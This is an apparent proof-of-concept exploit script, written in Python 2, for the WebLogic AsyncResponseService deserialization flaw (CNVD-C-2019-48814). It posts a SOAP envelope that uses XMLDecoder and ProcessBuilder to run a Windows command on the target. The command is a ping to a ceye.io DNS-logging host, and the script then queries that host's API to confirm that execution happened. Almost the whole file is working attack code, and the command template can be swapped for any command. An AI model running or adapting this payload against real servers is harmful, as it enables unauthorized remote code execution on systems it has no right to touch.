#!/usr/bin/env python

import requests
import sys


print """
  ____ _   ___     ______         ____     ____   ___  _  ___        _  _    ___   ___  _ _  _   
 / ___| \ | \ \   / /  _ \       / ___|   |___ \ / _ \/ |/ _ \      | || |  ( _ ) ( _ )/ | || |  
| |   |  \| |\ \ / /| | | |_____| |   _____ __) | | | | | (_) |_____| || |_ / _ \ / _ \| | || |_ 
| |___| |\  | \ V / | |_| |_____| |__|_____/ __/| |_| | |\__, |_____|__   _| (_) | (_) | |__   _|
 \____|_| \_|  \_/  |____/       \____|   |_____|\___/|_|  /_/         |_|  \___/ \___/|_|  |_|  
                                                                                                  
                                                                          2019-4-25 By Greekn
"""


def poc():
	url =str(sys.argv[1])
	tag =str(sys.argv[2])
	ceyecommand = "ping"  
	ceyeurl = "xxx.ceye.io"
	#ydueru.ceye.io
	path ="/_async/AsyncResponseService"
	#AsyncResponseServiceHttps
	#AsyncResponseServiceJms
	
	
	headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36",
    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    'Content-Type': "text/xml"
    
    }

	payload = """
	<?xml version="1.0" encoding="Utf-8"?>
	<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
		<soapenv:Header>
			<wsa:Action>xx</wsa:Action>
			<wsa:RelatesTo>xx</wsa:RelatesTo>
			<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
				<java version="1.8.0_131" class="java.beans.xmlDecoder">
					<void class="java.lang.ProcessBuilder">
						<array class="java.lang.String" length="3">
							<void index="0">
								<string>cmd</string>
							</void>
							<void index="1">
								<string>/c</string>
							</void>
							<void index="2">
								<string>{cmd_command}</string>
							</void>
						</array>
						<void method="start"/>
					</void>
				</java>
			</work:WorkContext>
		</soapenv:Header>
		<soapenv:Body>
			<asy:onAsyncDelivery/>
		</soapenv:Body>
	</soapenv:Envelope>
	"""
	
	payload=payload.format(cmd_command=ceyecommand+" "+tag+"."+ceyeurl)
	try:
		request = requests.post(url+path,data=payload,headers=headers)
		print request.headers
		if request.status_code == 202:
			print '[+] %s  Data transmission success!' % url
			cyeyapi = "http://api.ceye.io/v1/records?token=xxx&type=dns&filter="+tag
			cyey= requests.get(cyeyapi)
			print cyey.text
		else:
			print '[-] %s  Data transmission failed!' % url
	except:
		print '[-] %s  Address cannot be accessed!' % url

if __name__=='__main__':
		poc()